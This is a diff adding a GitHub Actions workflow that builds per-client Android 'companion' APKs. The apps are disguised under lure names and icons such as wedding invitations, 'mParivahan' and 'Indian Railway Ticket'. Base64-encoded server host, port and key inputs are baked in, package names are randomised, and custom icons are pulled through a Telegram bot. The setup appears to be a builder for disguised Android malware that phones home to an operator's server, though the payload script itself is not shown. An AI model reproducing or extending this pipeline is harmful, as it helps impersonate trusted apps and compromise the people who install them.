@@ -1,0 +1,281 @@
+name: Build Companion APK Only
+
+on:
+  # ── Auto-build on every push to main ────────────────────────────────────────
+  push:
+    branches: [ main ]
+
+  # ── Manual trigger ───────────────────────────────────────────────────────────
+  workflow_dispatch:
+    inputs:
+      template:
+        description: 'App template (wedding/shaadi/shaadi_hindi/mparivahan/railway/friends/bhabhi/custom)'
+        required: true
+        default: 'wedding'
+      client_id:
+        description: 'Client ID'
+        required: false
+        default: 'test'
+      custom_app_name:
+        description: 'Custom app name (only when template=custom)'
+        required: false
+        default: ''
+      custom_icon_file_id:
+        description: 'Telegram file_id of custom icon PNG (only when template=custom)'
+        required: false
+        default: ''
+      server_host_b64:
+        description: 'Base64-encoded server IP/host for companion'
+        required: false
+        default: ''
+      server_port_b64:
+        description: 'Base64-encoded server port for companion'
+        required: false
+        default: ''
+      server_key_b64:
+        description: 'Base64-encoded connection key for companion'
+        required: false
+        default: ''
+
+permissions:
+  contents: write
+
+jobs:
+  build:
+    name: Build Companion APK
+    runs-on: ubuntu-latest
+
+    env:
+      MODULE_ASSET:     app/src/main/assets/companion.apk
+      TEMPLATE:         ${{ github.event.inputs.template || 'wedding' }}
+      CLIENT_ID:        ${{ github.event.inputs.client_id || 'push-build' }}
+      CUSTOM_APP_NAME:  ${{ github.event.inputs.custom_app_name || '' }}
+      CUSTOM_ICON_FID:  ${{ github.event.inputs.custom_icon_file_id || '' }}
+      SERVER_HOST_B64:  ${{ github.event.inputs.server_host_b64 || '' }}
+      SERVER_PORT_B64:  ${{ github.event.inputs.server_port_b64 || '' }}
+      SERVER_KEY_B64:   ${{ github.event.inputs.server_key_b64 || '' }}
+      BOT_TOKEN:        ${{ secrets.TELEGRAM_BOT_TOKEN }}
+
+    steps:
+
+      # ── 1. Checkout ──────────────────────────────────────────────────────────
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+
+      # ── 1a. Set up JDK 17 ────────────────────────────────────────────────────
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          java-version: '17'
+          distribution: 'temurin'
+          cache: gradle
+
+      # ── 2. Install tools ─────────────────────────────────────────────────────
+      - name: Install tools
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y zipalign apksigner aapt python3-pil libsmali-java
+          pip3 install cryptography --break-system-packages 2>/dev/null || true
+
+          APKTOOL_VER="2.9.3"
+          wget -q "https://github.com/iBotPeaches/Apktool/releases/download/v${APKTOOL_VER}/apktool_${APKTOOL_VER}.jar" \
+               -O /usr/local/bin/apktool.jar
+          wget -q "https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool" \
+               -O /usr/local/bin/apktool
+          chmod +x /usr/local/bin/apktool
+          apktool --version || true
+
+          mkdir -p "$GITHUB_WORKSPACE/tools"
+          if [ -f /usr/share/java/smali.jar ]; then
+            cp /usr/share/java/smali.jar "$GITHUB_WORKSPACE/tools/smali.jar"
+            echo "smali.jar installed: $(du -h $GITHUB_WORKSPACE/tools/smali.jar | cut -f1)"
+          else
+            echo "::error::libsmali-java installed but /usr/share/java/smali.jar not found"
+            exit 1
+          fi
+
+      # ── 2a. Download custom icon from Telegram (if custom template) ───────────
+      - name: Download custom icon from Telegram
+        if: ${{ github.event.inputs.template == 'custom' && github.event.inputs.custom_icon_file_id != '' }}
+        run: |
+          FILE_ID="${CUSTOM_ICON_FID}"
+          RESP=$(curl -sf "https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${FILE_ID}")
+          FILE_PATH=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['result']['file_path'])")
+          if [ -z "$FILE_PATH" ]; then
+            echo "❌ Failed to get file path from Telegram"
+            exit 1
+          fi
+          curl -sf "https://api.telegram.org/file/bot${BOT_TOKEN}/${FILE_PATH}" -o custom_icon_raw.png
+          if [ ! -s custom_icon_raw.png ]; then
+            echo "❌ Failed to download icon file"
+            exit 1
+          fi
+          python3 -c "
+          from PIL import Image
+          img = Image.open('custom_icon_raw.png').convert('RGBA')
+          img = img.resize((512, 512), Image.LANCZOS)
+          img.save('app/src/main/res/drawable/app_icon.png')
+          print('✅ Custom icon downloaded and resized to 512x512')
+          "
+
+      # ── 2b. Select template icon ──────────────────────────────────────────────
+      - name: Select template icon
+        if: ${{ github.event.inputs.template != 'custom' || github.event.inputs.custom_icon_file_id == '' }}
+        run: |
+          TMPL="${{ github.event.inputs.template }}"
+          TMPL="${TMPL:-wedding}"
+          ICON_DIR="app/src/main/res/drawable/template_icons"
+          TARGET="app/src/main/res/drawable/app_icon.png"
+          if [ -f "${ICON_DIR}/${TMPL}.png" ]; then
+            cp "${ICON_DIR}/${TMPL}.png" "${TARGET}"
+            echo "✅ Icon set: ${TMPL}.png"
+          else
+            echo "⚠️ No icon for '${TMPL}' — using default (wedding)"
+          fi
+
+      # ── 2c. Generate mipmap icons ─────────────────────────────────────────────
+      - name: Generate mipmap icons from app_icon.png
+        run: |
+          python3 - << 'PYEOF'
+          from PIL import Image
+          import os
+
+          src = "app/src/main/res/drawable/app_icon.png"
+          if not os.path.exists(src):
+              print("app_icon.png not found — skipping icon resize")
+              exit(0)
+
+          img = Image.open(src).convert("RGBA")
+          bg  = Image.new("RGBA", img.size, (255, 255, 255, 255))
+          bg.paste(img, mask=img.split()[3])
+          img = bg.convert("RGB")
+
+          sizes = {
+              "mipmap-mdpi":    48,
+              "mipmap-hdpi":    72,
+              "mipmap-xhdpi":   96,
+              "mipmap-xxhdpi":  144,
+              "mipmap-xxxhdpi": 192,
+          }
+          for folder, size in sizes.items():
+              out = f"app/src/main/res/{folder}/ic_launcher.png"
+              os.makedirs(os.path.dirname(out), exist_ok=True)
+              img.resize((size, size), Image.LANCZOS).save(out, "PNG", optimize=True)
+              print(f"  ✅ {out}: {size}x{size}")
+          PYEOF
+
+      # ── 3. Validate template ──────────────────────────────────────────────────
+      - name: Validate template
+        run: |
+          TMPL="${{ github.event.inputs.template }}"
+          TMPL="${TMPL:-wedding}"
+          VALID="wedding shaadi shaadi_hindi mparivahan railway friends bhabhi custom"
+          if ! echo "$VALID" | grep -qw "$TMPL"; then
+            echo "❌ Invalid template: '${TMPL}'"
+            exit 1
+          fi
+          echo "✅ Template validated: ${TMPL}"
+
+      # ── 3c. Set app display name ──────────────────────────────────────────────
+      - name: Set app display name
+        run: |
+          TMPL="${{ github.event.inputs.template }}"
+          TMPL="${TMPL:-wedding}"
+          case "${TMPL}" in
+            wedding)      APP_DISPLAY="Wedding Invitation" ;;
+            shaadi)       APP_DISPLAY="Shaadi Ka Nimantran" ;;
+            shaadi_hindi) APP_DISPLAY="शादी का निमंत्रण" ;;
+            mparivahan)   APP_DISPLAY="mParivahan" ;;
+            railway)      APP_DISPLAY="Indian Railway Ticket" ;;
+            friends)      APP_DISPLAY="Friends Club" ;;
+            bhabhi)       APP_DISPLAY="Fun with Bhabhi" ;;
+            custom)       APP_DISPLAY="${CUSTOM_APP_NAME:-Custom App}" ;;
+            *)            APP_DISPLAY="Wedding Invitation" ;;
+          esac
+          sed -i "s|>Wedding Invitation<|>${APP_DISPLAY}<|" app/src/main/res/values/strings.xml
+          echo "✅ App name set: ${APP_DISPLAY}"
+
+      # ── 4. Generate package names ─────────────────────────────────────────────
+      - name: Generate companion package name
+        id: nova_pkg
+        run: |
+          TMPL="${{ github.event.inputs.template }}"
+          TMPL="${TMPL:-wedding}"
+          OUTPUT=$(python3 scripts/package_name_generator.py --template "${TMPL}")
+          NOVA_PKG=$(echo "$OUTPUT" | grep INSTALLER_PKG | cut -d= -f2)
+          MOD_PKG=$(echo "$OUTPUT" | grep MODULE_PKG | cut -d= -f2)
+          VER_CODE=$(echo "$OUTPUT" | grep VERSION_CODE  | cut -d= -f2)
+          echo "NOVA_PKG=${NOVA_PKG}"   >> $GITHUB_OUTPUT
+          echo "MOD_PKG=${MOD_PKG}"     >> $GITHUB_OUTPUT
+          echo "VER_CODE=${VER_CODE}"   >> $GITHUB_OUTPUT
+          echo "✅ Module pkg: ${MOD_PKG}"
+          echo "✅ Version code: ${VER_CODE}"
+
+      # ── 5. Setup Android SDK ──────────────────────────────────────────────────
+      - name: Setup Android SDK
+        uses: android-actions/setup-android@v4
+        with:
+          packages: ''
+
+      - name: Install Android platform and build-tools
+        run: |
+          echo "$ANDROID_SDK_ROOT/cmdline-tools/latest/bin" >> $GITHUB_PATH
+          sdkmanager "platforms;android-34" "build-tools;34.0.0"
+          sdkmanager "ndk;25.2.9519653" "cmake;3.18.1"
+          echo "$ANDROID_SDK_ROOT/ndk/25.2.9519653/toolchains/llvm/prebuilt/linux-x86_64/bin" >> $GITHUB_PATH
+
+      # ── 6. Build companion APK ────────────────────────────────────────────────
+      - name: Build companion APK
+        env:
+          OLD_PKG:           ${{ env.OLD_PKG }}
+          NEW_MOD_PKG:       ${{ steps.nova_pkg.outputs.MOD_PKG }}
+          MOD_VER_CODE:      ${{ steps.nova_pkg.outputs.VER_CODE }}
+          MODULE_ASSET:      ${{ env.MODULE_ASSET }}
+          NOVA_PKG:          ${{ steps.nova_pkg.outputs.NOVA_PKG }}
+          GITHUB_OUTPUT:     $GITHUB_OUTPUT
+          KEYSTORE_BASE64:   ${{ secrets.KEYSTORE_BASE64 }}
+          KEYSTORE_PASSWORD: ${{ secrets.KEYSTORE_PASSWORD }}
+          KEY_ALIAS:         ${{ secrets.KEY_ALIAS }}
+        run: |
+          set -e
+
+          echo "ANDROID_SDK_ROOT=${ANDROID_SDK_ROOT}"
+          if [ -z "${ANDROID_SDK_ROOT}" ]; then
+            echo "::error::ANDROID_SDK_ROOT is not set"
+            exit 1
+          fi
+
+          if [ -d "${ANDROID_SDK_ROOT}/build-tools" ] && \
+             [ -n "$(ls ${ANDROID_SDK_ROOT}/build-tools/ 2>/dev/null)" ]; then
+            BUILD_TOOLS=$(ls ${ANDROID_SDK_ROOT}/build-tools/ | sort -V | tail -1)
+            export PATH="${ANDROID_SDK_ROOT}/build-tools/${BUILD_TOOLS}:$PATH"
+            echo "Using SDK build-tools: ${BUILD_TOOLS}"
+          else
+            echo "SDK build-tools not found — using system apksigner"
+          fi
+
+          echo "apksigner: $(which apksigner)"
+          apksigner version
+
+          export MODULE_AUDIT_LOG="${GITHUB_WORKSPACE}/module_audit.log"
+          python3 -u scripts/build_module.py 2>&1 | tee companion_build.log
+          exit ${PIPESTATUS[0]}
+
+      # ── 7. Upload companion APK as artifact ───────────────────────────────────
+      - name: Upload companion APK artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: companion-apk-${{ github.run_number }}
+          path: app/src/main/assets/companion.apk
+          retention-days: 7
+
+      # ── 8. Upload build logs (always) ─────────────────────────────────────────
+      - name: Upload build logs
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: companion-build-logs-${{ github.run_number }}
+          path: |
+            companion_build.log
+            module_audit.log
+          retention-days: 7
